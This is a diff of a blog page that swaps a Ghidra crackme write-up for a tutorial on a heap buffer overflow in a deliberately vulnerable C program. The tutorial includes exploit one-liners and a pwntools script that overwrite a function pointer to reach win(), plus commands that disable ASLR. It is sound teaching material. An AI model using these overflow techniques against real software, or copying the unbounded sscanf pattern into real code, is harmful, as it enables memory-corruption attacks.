@@ -11,7 +11,7 @@
 
   <title>
     
-      Solving a Basic Crackme Using Ghidra &middot; Nihaal Prasad
+      Simple Heap Buffer Overflow &middot; Nihaal Prasad
     
   </title>
 
@@ -184,7 +184,7 @@
 
     <main class="container">
       <div class="content">
-  <h1 class="page-heading">Solving a Basic Crackme Using Ghidra</h1>
+  <h1 class="page-heading">Simple Heap Buffer Overflow</h1>
   <div class="post-meta">
   <span class="post-categories">
     
@@ -193,101 +193,196 @@
 
   <hr>
   <div class="post-body">
-    <p>Recently, the NSA released a free reverse-engineering tool called <a href="https://www.nsa.gov/resources/everyone/ghidra/">Ghidra</a>. Today, I decided to take a look at it and try to solve a basic crackme using this tool. <a href="https://crackmes.one/crackme/5c1a939633c5d41e58e005d1">This</a> is the link to the crackme that I will be trying to solve today.</p>
+    <p>Earlier today, I was messing around with some code, and I came up with <a href="../../../assets/other/2020-10-21-heap-buffer-overflow/people.c">this vulnerable program</a>. This program was written using bad programming habits on purpose, and I am going to show you how it is vulnerable to a buffer overflow. This isn’t a complicated vulnerability, and while it does involve corrupting memory on the heap, it does not require you to have in-depth knowledge about how the heap works (unlike many other heap exploits).</p>
 
-<p>Once I downloaded the crackme file, I ran it and looked at what the program did. Here is its basic output:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enter the magic string
-a
-wrong string
-No flag for you.
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo </span>0 | <span class="nb">sudo tee</span> /proc/sys/kernel/randomize_va_space
 </code></pre></div></div>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enter the magic string
-Some Random Input
-too long...sorry no flag for you!!!
+
+<p>First of all, I am going to disable ASLR on my computer using the above command. This will make explaining the vulnerability a little bit easier, but later, I will show you a Python script that works even if ASLR is enabled.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./people
+win() is at 0x55555555529f.
+
+Valid commands:
+new: Give birth to a new person.
+greet: Say hello to a person.
+kill: Kill a person.
+quit: Stop the program.
+
+&gt; 
 </code></pre></div></div>
-<p>It looks like it takes some sort of input value, and if that input value is what it expects, then it will print out the flag. If the input value is incorrect or too long, then it will print out a different message. Our goal here is to find out the correct input value.</p>
 
-<p>I started up Ghidra, created a new project, and added the binary file to my project. You can do this by first clicking File-&gt;New Project, and then dragging and dropping the binary file into the project.</p>
+<p>When you first run the program, you’ll see that it leaks the location of a function called <code class="highlighter-rouge">win()</code>. Our goal is to execute <code class="highlighter-rouge">win()</code>, which prints out the flag.</p>
 
-<p><img src="../../../assets/img/2019-solving-a-basic-crackme-using-ghidra/ghidra_project.png" /></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"flag{insert_flag_here}</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
 
-<p><img style="float: right" src="../../../assets/img/2019-solving-a-basic-crackme-using-ghidra/symbol_tree.png" /></p>
+<p>The program allows the user to type in various commands, so let’s see what happens when we issue the “new” command while running the program.</p>
 
-<p>When I opened the file in Ghidra, a pop-up came up in Ghidra asking me if I wanted to analyze the binary now. I hit yes and waited a second before it was done analyzing the file. Then I went to the symbol tree on the left, typed in “main” to find the main function, and clicked on it. This brought me to the main method, and on the other two windows I could see the main method’s assembly and decompiled code.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; new
+Enter the person's name: Nihaal
+Nihaal was born at 0x555555559ac0.
+</code></pre></div></div>
 
-<p>Here is the decompiled code. I changed a few of the variable names to make it a little bit more readable. You can do this by right-clicking on the variable and clicking “Rename variable.”</p>
+<p>The new command allows the user to create a new <code class="highlighter-rouge">Person</code> on the heap, and it will print out the heap address where it was created. In this case, the program stored information about our <code class="highlighter-rouge">Person</code> at address <code class="highlighter-rouge">0x555555559ac0</code>. Looking at the code, we can see that this is implemented using a structure called <code class="highlighter-rouge">Person</code>.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>undefined8 main(void)
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_Person</span> <span class="n">Person</span><span class="p">;</span>
+<span class="k">typedef</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="n">Person</span> <span class="o">*</span><span class="p">);</span>
 
-{
-  size_t len;
-  size_t len2;
-  long lVar1;
-  char input [112];
-  int counter;
-  int strValues;
-  
-  strValues = 0;
-  puts("enter the magic string");
-  fgets(input,100,stdin);
-  len = strlen(input);
-  if (len &lt; 0xc) {
-    counter = 0;
-    while( true ) {
-      len2 = strlen(input);
-      if (len2 &lt;= (ulong)(long)counter) break;
-      strValues = strValues + (int)input[(long)counter];
-      counter = counter + 1;
-    }
-    if (strValues == 1000) {
-      lVar1 = strcat_str();
-      printf("flag is flag{");
-      counter = 0;
-      while (counter &lt; 10) {
-        putchar((int)*(char *)(lVar1 + (long)counter));
-        counter = counter + 1;
-      }
-      puts("}");
-    }
-    else {
-      puts("wrong string\nNo flag for you.");
-    }
-  }
-  else {
-    puts("too long...sorry no flag for you!!!");
-  }
-  return 0;
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_Person</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="n">func</span> <span class="n">greeting</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">Person</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Something that is interesting is that this structure also contains a function pointer called <code class="highlighter-rouge">greeting</code>. If we look a little bit further down in the code, we can see that there are two more functions, each of which contain some kind of greeting.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">hello</span><span class="p">(</span><span class="n">Person</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s says hello.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">yo</span><span class="p">(</span><span class="n">Person</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s says yo.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Let’s go back to the running program again and use the <code class="highlighter-rouge">greet</code> command to see what happens.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; greet
+Type in the address of the person you want to say hi to: 0x555555559ac0
+You say hello to Nihaal.
+Nihaal says yo.
+&gt; 
+</code></pre></div></div>
+
+<p>Interesting. What happens if we create another user and do the same thing?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; new
+Enter the person's name: Sam
+Sam was born at 0x555555559af0.
+&gt; greet
+Type in the address of the person you want to say hi to: 0x555555559af0
+You say hello to Sam.
+Sam says hello.
+&gt; 
+</code></pre></div></div>
+
+<p>Notice how in the first instance, we were greated with “yo,” but in the second instance, we were greated with “hello.” What is happening here is that in the first <code class="highlighter-rouge">Person</code> instance, we had set the function pointer <code class="highlighter-rouge">greeting</code> equal to <code class="highlighter-rouge">yo</code>, and it had executed the <code class="highlighter-rouge">yo()</code> function. In the second <code class="highlighter-rouge">Person</code> instance, we had set the function pointer <code class="highlighter-rouge">greeting</code> equal to <code class="highlighter-rouge">hello</code>, and it executed the <code class="highlighter-rouge">hello()</code> function instead.</p>
+
+<p>This is essentially how object-oriented programming and polymorphism can be emulated in C. While C is obviously not an object-oriented language, you can still incorporate object-oriented behavior in C code by maintaining pointers to functions in structures. When you want to change the behavior of an object, all you have to do is change the function pointer in its structure for that instance of the object.</p>
+
+<p>Let’s take a look at the code responsible for dealing with the <code class="highlighter-rouge">new</code> command, which is located in <code class="highlighter-rouge">main()</code>. I’ve added some comments to the code to explain what’s going on.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"new"</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Buf contains the user input, and it can have a maximum of BUF_SIZE characters.</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">Person</span><span class="p">));</span> <span class="c1">// p is a Person* variable</span>
+                                <span class="c1">// Whoops, I forget to check for malloc() returning NULL. Oh well.</span>
+    <span class="n">p</span><span class="o">-&gt;</span><span class="n">greeting</span> <span class="o">=</span> <span class="n">greeting_flip</span> <span class="o">?</span> <span class="n">hello</span> <span class="o">:</span> <span class="n">yo</span><span class="p">;</span> <span class="c1">// Set the greeting to be either hello() or yo()</span>
+                                              <span class="c1">// Note that greeting_flip is initialized to 0, so "yo" will always be the first greeting</span>
+    <span class="n">greeting_flip</span> <span class="o">=</span> <span class="o">!</span><span class="n">greeting_flip</span><span class="p">;</span> <span class="c1">// Use the other greeting next time</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter the person</span><span class="se">\'</span><span class="s">s name: "</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">BUF_SIZE</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span> <span class="c1">// Get user input</span>
+    <span class="n">sscanf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span> <span class="c1">// Copy the person's name to the name buffer in p</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s was born at %p.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span> <span class="c1">// Print out the location where p is stored on the heap</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">p</code> variable is a type of <code class="highlighter-rouge">Person</code> that was just allocated memory using <code class="highlighter-rouge">malloc()</code>. The <code class="highlighter-rouge">greeting_flip</code> variable is initially set to 0, which means that <code class="highlighter-rouge">greeting</code> will always be first set to <code class="highlighter-rouge">yo</code>. It will then flip back and forth between using <code class="highlighter-rouge">hello</code> and using <code class="highlighter-rouge">yo</code> as the greeting function whenever you create a new <code class="highlighter-rouge">Person</code>.</p>
+
+<p>Now lets take a look at the code responsible for dealing with the <code class="highlighter-rouge">greet</code> command, which is also located in <code class="highlighter-rouge">main()</code>.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>else if(strncmp(buf, "greet", 5) == 0) { // Check if user input is "greet"
+    printf("Type in the address of the person you want to say hi to: ");
+    fgets(buf, BUF_SIZE, stdin); // Scan the address into buf
+    sscanf(buf, "%p", &amp;p); // Convert the address into a Person* pointer
+    printf("You say hello to %s.\n", p-&gt;name);
+    p-&gt;greeting(p); // Execute the greeting function
 }
 </code></pre></div></div>
 
-<p>The first thing that the code does is print out “enter the magic string” and reads in the value that you typed in into a variable that I named “input”. It also calculates the length of this input variable and makes sure that it is less than 12 (which makes it a maximum of ten characters plus a newline character). After that, there is a loop that adds up all of the ascii values of each character of the input into an integer that I named “strValues”. Then, finally, it prints out the flag if the total values of all the added ascii values equals 1000.</p>
+<p>Once you use the <code class="highlighter-rouge">greet</code> command, notice how the program executes whatever function <code class="highlighter-rouge">greeting</code> is equal to. What if there was a way for us to control the function pointer <code class="highlighter-rouge">greeting</code>? If we were able to set <code class="highlighter-rouge">greeting</code> equal to the address of <code class="highlighter-rouge">win()</code>, then we could execute <code class="highlighter-rouge">win()</code> when we greet a person. This would print out the flag and solve the problem!</p>
 
-<p>Since I knew that I could type in a maximum of ten characters, the first thing I tried to do was to divide 1000 by 10 to figure out the ascii value of the characters that I needed to type in ten times. Since 1000/10 = 100, and ‘d’ is 100 in ascii, I decided to type in ‘d’ ten times and see what happened.</p>
+<p>Note that in both code segments, the call to <code class="highlighter-rouge">fgets()</code> uses <code class="highlighter-rouge">BUF_SIZE</code> as the size of the buffer. From the programmer’s perspective, this makes sense because <code class="highlighter-rouge">buf</code> is an array on the stack with length <code class="highlighter-rouge">BUF_SIZE</code>. Scroll to the top of the C file to see what <code class="highlighter-rouge">BUF_SIZE</code> is.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c "print('d' * 10)" | ./rev30
-enter the magic string
-wrong string
-No flag for you.
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define BUF_SIZE 128
+</span></code></pre></div></div>
+
+<p>Wait, hold on a second. Wasn’t the <code class="highlighter-rouge">name</code> buffer in <code class="highlighter-rouge">Person</code> only 32 bytes long? We were copying whatever string was inside the buffer to <code class="highlighter-rouge">name</code>, so can we overflow the <code class="highlighter-rouge">name</code> buffer? Are we able to overwrite the value of the <code class="highlighter-rouge">greeting</code> pointer that comes directly after <code class="highlighter-rouge">name</code>? To answer these questions, let’s see what happens when we give the program a large input value.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./people
+win() is at 0x55555555529f.
+
+Valid commands:
+new: Give birth to a new person.
+greet: Say hello to a person.
+kill: Kill a person.
+quit: Stop the program.
+
+&gt; new
+Enter the person's name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA was born at 0x555555559ac0.
+&gt; greet
+Type in the address of the person you want to say hi to: 0x555555559ac0
+You say hello to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
+Segmentation fault
 </code></pre></div></div>
 
-<p>Unforunately, this did not work. At first I didn’t understand why this didn’t work, but then I realized that I forgot to take into account the fact that the while loop was also adding up the value of the newline character, which had an ascii value of 10. This meant that instead of doing 1000/10 to figure out the ascii value of the character I had to type in 10 times, I had to do (1000-10)/10 to take this into account. This gave me a value of 99, or ‘c’ in ascii. I tried to use ‘c’ ten times, and lo and behold:</p>
+<p>The program gave us a segmentation fault after we tried to greet that person. This means that we most likely overwrote the <code class="highlighter-rouge">greeting</code> parameter, and if we’re able to control the <code class="highlighter-rouge">greeting</code> parameter, we can execute whatever function we want to! Since the <code class="highlighter-rouge">name</code> attribute is 32 characters long, we could probably just write the address of <code class="highlighter-rouge">win()</code> right after it. Then we could use the <code class="highlighter-rouge">greet</code> command to execute our code.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c "print('c' * 10)" | ./rev03 
-enter the magic string
-flag is flag{!#&amp;*/5&lt;DMW}
+<p>Since ASLR is currently disabled, we know that the address of <code class="highlighter-rouge">win()</code> will always be <code class="highlighter-rouge">0x55555555529f</code>, which is written as <code class="highlighter-rouge">b'\x9fRUUUU'</code> as a Python little-endian byte string. Also, because ASLR is disabled, we also know that the first address that <code class="highlighter-rouge">malloc()</code> will return will always be <code class="highlighter-rouge">0x55555555a6c0</code>. This address does not have to be inputted in little endian format because the <code class="highlighter-rouge">%p</code> string formatter automatically converts it to little-endian format.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c "import sys; sys.stdout.buffer.write(b'new\n' + b'A'*32 + b'\x9fRUUUU' + b'\ngreet\n' + b'0x55555555a6c0\n' + b'q\n')" | ./people
+win() is at 0x55555555529f.
+
+Valid commands:
+new: Give birth to a new person.
+greet: Say hello to a person.
+kill: Kill a person.
+quit: Stop the program.
+
+&gt; Enter the person's name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�RUUUU was born at 0x55555555a6c0.
+&gt; Type in the address of the person you want to say hi to: You say hello to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�RUUUU.
+flag{insert_flag_here}
+&gt; Ending program.
 </code></pre></div></div>
 
-<p>Thanks for reading this writeup. I hope you enjoyed it.</p>
+<p>My exploit above will first issue the “new” command to create a new <code class="highlighter-rouge">Person</code>. Then it will overflow the <code class="highlighter-rouge">name</code> buffer on the heap so that we are able to overwrite <code class="highlighter-rouge">greeting</code> with the address of <code class="highlighter-rouge">win()</code>. From there, we issue a <code class="highlighter-rouge">greet</code> command. The <code class="highlighter-rouge">greet</code> command requires the address of the <code class="highlighter-rouge">Person</code> as input, and since we know that <code class="highlighter-rouge">malloc()</code> will always first return <code class="highlighter-rouge">0x55555555a6c0</code>, we can just supply that as the <code class="highlighter-rouge">Person</code>’s address. This will execute the function that <code class="highlighter-rouge">greeting</code> points to, which is <code class="highlighter-rouge">win()</code> in this case. From there, we can issue the <code class="highlighter-rouge">q</code> command to exit the program.</p>
+
+<p>This exploit uses hardcoded addresses, but since the program leaks the addresses of <code class="highlighter-rouge">win()</code> and each <code class="highlighter-rouge">Person</code> that we create, it is simple to write a script that exploits this program even when ASLR is enabled.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from pwn import *
+
+# Start the process and get the flag
+p = process("./people")
+win_addr = p64(int(str(p.recv()).split("\\n")[0].split(" ")[3][:-1], 16))
+
+# Create a new person, set his/her greeting to win_addr, and get their address
+p.sendline(b"new")
+p.sendline(b"A"*32 + win_addr)
+person_addr = p64(int(str(p.recv()).split("\\n")[0].split()[9][:-1], 16))
+
+# Execute the win() function and get the flag
+p.sendline(b"greet")
+p.sendline(person_addr)
+print(str(p.recv()).split("\\n")[1])
+
+# End the program
+p.sendline(b"kill")
+p.sendline(person_addr)
+p.sendline(b"q")
+</code></pre></div></div>
+
+<p>And this is what happens when we run the script with ASLR turned on.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+2
+$ python solver.py
+[+] Starting local process './people': pid 40221
+flag{insert_flag_here}
+</code></pre></div></div>
 
 <section class="related">
   <h3 style="color: black">Related Posts</h3>
   <ul class="post-list">
-    
-      <li style="color: black; font-size: 9;">
-        <a href="/2020/10/21/simple-heap-buffer-overflow.html">
-          Simple Heap Buffer Overflow
-        </a>
-      </li>
     
       <li style="color: black; font-size: 9;">
         <a href="/2020/10/14/return-oriented-programming-tutorial.html">
@@ -298,6 +393,12 @@ flag is flag{!#&amp;*/5&lt;DMW}
       <li style="color: black; font-size: 9;">
         <a href="/2020/07/21/pentesting-greenoptic-1.html">
           Pentesting GreenOptic: 1
+        </a>
+      </li>
+    
+      <li style="color: black; font-size: 9;">
+        <a href="/2020/03/27/creating-a-barebones-windows-debugger.html">
+          Creating a Barebones Windows Debugger
         </a>
       </li>
     
